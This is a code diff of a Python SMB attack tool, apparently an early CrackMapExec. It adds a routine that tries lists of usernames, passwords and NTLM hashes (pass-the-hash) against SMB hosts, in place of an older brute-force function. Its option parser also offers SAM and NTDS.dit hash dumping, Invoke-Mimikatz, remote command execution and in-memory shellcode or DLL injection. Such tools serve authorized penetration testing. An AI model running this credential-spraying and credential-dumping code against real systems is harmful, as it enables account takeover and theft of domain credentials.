@@ -32,6 +32,7 @@ from time import ctime, time
 from termcolor import cprint, colored
 
 import StringIO
+import csv
 import ntpath
 import socket
 import hashlib
@@ -2290,6 +2291,114 @@ class RPCENUM():
         #resp = srvs.hNetrSessionEnum(dce, NULL, NULL, 10)
         #resp.dump()
 
+def smart_login(host, smb, domain):
+    if args.combo_file:
+        with open(args.combo_file, 'r') as combo_file:
+            for line in combo_file:
+                try:
+                    line = line.strip()
+
+                    lmhash = ''
+                    nthash = ''
+
+                    if '\\' in line:
+                        domain, user_pass = line.split('\\')
+                    else:
+                        user_pass = line
+
+                    '''
+                    Here we try to manage two cases: if an entry has a hash as the password,
+                    or if the plain-text password contains a ':'
+                    '''
+                    if len(user_pass.split(':')) == 3:
+                        hash_or_pass = ':'.join(user_pass.split(':')[1:3]).strip()
+
+                        #Not the best way to determine of it's an NTLM hash :/
+                        if len(hash_or_pass) == 65 and len(hash_or_pass.split(':')[0]) == 32 and len(hash_or_pass.split(':')[1]) == 32:
+                            lmhash, nthash = hash_or_pass.split(':')
+                            passwd = hash_or_pass
+                            user = user_pass.split(':')[0]
+
+                    elif len(user_pass.split(':')) == 2:
+                        user, passwd = user_pass.split(':')
+
+                    try:
+                        smb.login(user, passwd, domain, lmhash, nthash)
+                        print_succ("{}:{} {}\\{}:{} Login successful".format(host, args.port, domain, user, passwd))
+                        return smb
+                    except SessionError as e:
+                        print_error("{}:{} {}\\{}:{} {}".format(host, args.port, domain, user, passwd, e))
+                        continue
+
+                except Exception as e:
+                    print_error("Error parsing line '{}' in combo file: {}".format(line, e))
+                    continue
+    else:
+        usernames = []
+        passwords = []
+        hashes    = []
+
+        if args.user:
+            if os.path.exists(args.user):
+                usernames = open(args.user, 'r')
+            else:
+                usernames = args.user.split(',')
+
+        if args.passwd:
+            if os.path.exists(args.passwd):
+                passwords = open(args.passwd, 'r')
+            else:
+                '''
+                You might be wondering: wtf is this? why not use split()?
+                This is in case a password contains a comma! we can use '\\' to make sure it's parsed correctly
+                IMHO this is a much better way than writing a custom split() function
+                '''
+                passwords = csv.reader(StringIO.StringIO(args.passwd), delimiter=',', escapechar='\\').next()
+
+        if args.hash:
+            if os.path.exists(args.hash):
+                hashes = open(args.hash, 'r')
+            else:
+                hashes = args.hash.split(',')
+
+        for user in usernames:
+            user = user.strip()
+
+            try:
+                hashes.seek(0)
+            except AttributeError:
+                pass
+
+            try:
+                passwords.seek(0)
+            except AttributeError:
+                pass
+
+            if hashes:
+                for ntlm_hash in hashes:
+                    ntlm_hash = ntlm_hash.strip()
+                    lmhash, nthash = ntlm_hash.split(':')
+                    try:
+                        smb.login(user, '', domain, lmhash, nthash)
+                        print_succ("{}:{} {}\\{}:{} Login successful".format(host, args.port, domain, user, ntlm_hash))
+                        return smb
+                    except SessionError as e:
+                        print_error("{}:{} {}\\{}:{} {}".format(host, args.port, domain, user, ntlm_hash, e))
+                        continue
+
+            if passwords:
+                for passwd in passwords:
+                    passwd = passwd.strip()
+                    try:
+                        smb.login(user, passwd, domain, '', '')
+                        print_succ("{}:{} {}\\{}:{} Login successful".format(host, args.port, domain, user, passwd))
+                        return smb
+                    except SessionError as e:
+                        print_error("{}:{} {}\\{}:{} {}".format(host, args.port, domain, user, passwd, e))
+                        continue
+
+    raise socket.error
+
 def spider(smb_conn,ip, share, subfolder, patt, depth):
     try:
         filelist = smb_conn.listPath(share, subfolder+'\\*')
@@ -2313,23 +2422,6 @@ def dir_list(files,ip,path,pattern):
                 else:
                     print_att("//%s/%s/%s" % (ip, path.replace("//",""), result.get_longname().encode('utf8')))
     return 0
-
-def bruteforce(host, smb, s_name, domain):
-    usernames = open(args.bruteforce[0], 'r')
-    passwords = open(args.bruteforce[1], 'r')
-
-    for user in usernames:
-        passwords.seek(0)
-        for passw in passwords:
-            try:
-                #print "Trying {}:{}".format(user.strip(),passw.strip())
-                smb.login(user.strip(), passw.strip(), domain, '', '')
-                print_succ("{}:{} {} Found valid account! Domain: {} Username: {} Password: {}".format(host, args.port, s_name, yellow(domain), yellow(user.strip()), yellow(passw.strip())))
-                if args.exhaust is False:
-                    return
-            except SessionError as e:
-                if "STATUS_LOGON_FAILURE" in e.message:
-                    pass
 
 def normalize_path(path):
     path = r'{}'.format(path)
@@ -2429,8 +2521,10 @@ def connect(host):
 
         print_status("{}:{} is running {} (name:{}) (domain:{})".format(host, args.port, smb.getServerOS(), s_name, domain))
 
-        #DC's seem to want us to logoff first
-        #Workstations sometimes reset the connection, so we handle that here
+        '''
+        DC's seem to want us to logoff first
+        Workstations sometimes reset the connection, so we handle both cases here
+        '''
         try:
             smb.logoff()
         except NetBIOSError:
@@ -2438,24 +2532,11 @@ def connect(host):
         except socket.error:
             smb = SMBConnection(host, host, None, args.port)
 
-        if args.bruteforce:
-            start_time = time()
-            print_status("{}:{} {} Started SMB bruteforce".format(host, args.port, s_name))
-            bruteforce(host, smb, s_name, domain)
-            print_status("{}:{} {} Finished SMB bruteforce (Completed in: {})".format(host, args.port, s_name, time() - start_time))
+        if (args.user and (args.passwd or args.hash)) or args.combo_file:
 
-        if args.user and (args.passwd or args.hash):
-            lmhash = ''
-            nthash = ''
-            if args.hash:
-                args.passwd = args.hash
-                lmhash, nthash = args.hash.split(':')
+            smb = smart_login(host, smb, domain)
 
             noOutput = False
-            smb.login(args.user, args.passwd, domain, lmhash, nthash)
-
-            print_succ("{}:{} Login successful '{}\\{}:{}'".format(host, args.port, domain, args.user, args.passwd))
-
             local_ip = smb.getSMBServer().get_socket().getsockname()[0]
 
             if args.download:
@@ -2662,20 +2743,21 @@ if __name__ == '__main__':
                                     epilog='There\'s been an awakening... have you felt it?')
 
     parser.add_argument("-t", type=int, dest="threads", required=True, help="Set how many concurrent threads to use")
-    parser.add_argument("-u", metavar="USERNAME", dest='user', default=None, help="Username, if omitted null session assumed")
-    parser.add_argument("-p", metavar="PASSWORD", dest='passwd', default=None, help="Password")
-    parser.add_argument("-H", metavar="HASH", dest='hash', default=None, help='NTLM hash')
-    parser.add_argument("-C", metavar="COMBO_FILE", dest='combo_file', type=str, help="Combo file containing a list of domain\\username:password entries" )
-    parser.add_argument("-n", metavar='NAMESPACE', dest='namespace', default='//./root/cimv2', help='Namespace name (default //./root/cimv2)')
+    parser.add_argument("-u", metavar="USERNAME", dest='user', type=str, default=None, help="Username(s) or file containing usernames")
+    parser.add_argument("-p", metavar="PASSWORD", dest='passwd', type=str, default=None, help="Password(s) or file containing passwords")
+    parser.add_argument("-H", metavar="HASH", dest='hash', type=str, default=None, help='NTLM hash(es) or file containing NTLM hashes')
+    parser.add_argument("-C", metavar="COMBO_FILE", dest='combo_file', type=str, help="Combo file containing a list of domain\\username:password or username:password entries")
     parser.add_argument("-d", metavar="DOMAIN", dest='domain', default=None, help="Domain name")
+    parser.add_argument("-n", metavar='NAMESPACE', dest='namespace', default='//./root/cimv2', help='WMI Namespace (default //./root/cimv2)')
     parser.add_argument("-s", metavar="SHARE", dest='share', default="C$", help="Specify a share (default: C$)")
-    parser.add_argument("-P", dest='port', type=int, choices={139, 445}, default=445, help="SMB port (default: 445)")
+    parser.add_argument("--port", dest='port', type=int, choices={139, 445}, default=445, help="SMB port (default: 445)")
     parser.add_argument("-v", action='store_true', dest='verbose', help="Enable verbose output")
     parser.add_argument("target", nargs=1, type=str, help="The target range, CIDR identifier or file containing targets")
 
     rgroup = parser.add_argument_group("Credential Gathering", "Options for gathering credentials")
     rgroup.add_argument("--sam", action='store_true', help='Dump SAM hashes from target systems')
     rgroup.add_argument("--mimikatz", action='store_true', help='Run Invoke-Mimikatz on target systems')
+    rgroup.add_argument("--mimikatz-cmd", metavar='MIMIKATZ_CMD', dest='mimi_cmd', help='Run Invoke-Mimikatz with the specified command')
     rgroup.add_argument("--ntds", choices={'vss', 'drsuapi', 'ninja'}, help="Dump the NTDS.dit from target DCs using the specifed method\n(drsuapi is the fastest)")
 
     egroup = parser.add_argument_group("Mapping/Enumeration", "Options for Mapping/Enumerating")
@@ -2684,10 +2766,6 @@ if __name__ == '__main__':
     egroup.add_argument("--users", action='store_true', dest='enum_users', help='Enumerate users')
     egroup.add_argument("--lusers", action='store_true', dest='enum_lusers', help='Enumerate logged on users')
     egroup.add_argument("--wmi", metavar='QUERY', type=str, dest='wmi_query', help='Issues the specified WMI query')
-
-    dgroup = parser.add_argument_group("Account Bruteforcing", "Options for bruteforcing SMB accounts")
-    dgroup.add_argument("--bruteforce", nargs=2, metavar=('USER_FILE', 'PASS_FILE'), help="Your wordlists containing Usernames and Passwords")
-    dgroup.add_argument("--exhaust", action='store_true', help="Don't stop on first valid account found")
 
     sgroup = parser.add_argument_group("Spidering", "Options for spidering shares")
     sgroup.add_argument("--spider", metavar='FOLDER', type=str, default='', help='Folder to spider (defaults to share root dir)')
@@ -2699,7 +2777,6 @@ if __name__ == '__main__':
     cgroup.add_argument('--execm', choices={"wmi", "smbexec", "atexec"}, default="smbexec", help="Method to execute the command (default: smbexec)")
     cgroup.add_argument("-x", metavar="COMMAND", dest='command', help="Execute the specified command")
     cgroup.add_argument("-X", metavar="PS_COMMAND", dest='pscommand', help='Excute the specified powershell command')
-    cgroup.add_argument("-M", metavar='MIMIKATZ_CMD', dest='mimi_cmd', help='Run Invoke-Mimikatz with the specified command')
 
     xgroup = parser.add_argument_group("Shellcode/EXE/DLL injection", "Options for injecting Shellcode/EXE/DLL's in memory using PowerShell")
     xgroup.add_argument("--inject", choices={'shellcode', 'exe', 'dll'}, help='Inject Shellcode, EXE or a DLL')
@@ -2784,9 +2861,9 @@ if __name__ == '__main__':
 
         args.pattern = patterns
 
-    if args.bruteforce:
-        if not os.path.exists(args.bruteforce[0]) or not os.path.exists(args.bruteforce[1]):
-            print_error("Unable to find username or password wordlist at specified path")
+    if args.combo_file:
+        if not os.path.exists(args.combo_file):
+            print_error('Unable to find combo file at specified path')
             sys.exit(1)
 
     if args.mimikatz or args.mimi_cmd or args.inject or (args.ntds == 'ninja'):
@@ -2798,41 +2875,7 @@ if __name__ == '__main__':
         t.setDaemon(True)
         t.start()
 
-    if args.combo_file:
-        if not os.path.exists(args.combo_file):
-            print_error('Unable to find combo file at specified path')
-            sys.exit(1)
-
-        with open(args.combo_file, 'r') as combo_file:
-            for line in combo_file:
-                try:
-                    domain, user_pass = line.split('\\')
-                    args.domain = domain
-                    '''
-                    Here we try to manage two cases: if we supplied a hash as the password,
-                    or if the plain-text password contains a ':'
-                    '''
-
-                    if len(user_pass.split(':')) == 3:
-                        hash_or_pass = ':'.join(user_pass.split(':')[1:3]).strip()
-
-                        #defenitly not the best way to determine of it's an NTLM hash :/
-                        if len(hash_or_pass) == 65 and len(hash_or_pass.split(':')[0]) == 32 and len(hash_or_pass.split(':')[1]) == 32:
-                            args.hash = hash_or_pass
-
-                        args.user = user_pass.split(':')[0]
-
-                    elif len(user_pass.split(':')) == 2:
-                        args.user, args.passwd = user_pass.split(':')
-
-                    concurrency(hosts)
-
-                except Exception as e:
-                    print_error("Error parsing line in combo file: {}".format(e))
-                    continue
-
-    else:
-        concurrency(hosts)
+    concurrency(hosts)
 
     if args.mimikatz or args.inject or args.ntds == 'ninja':
         try:
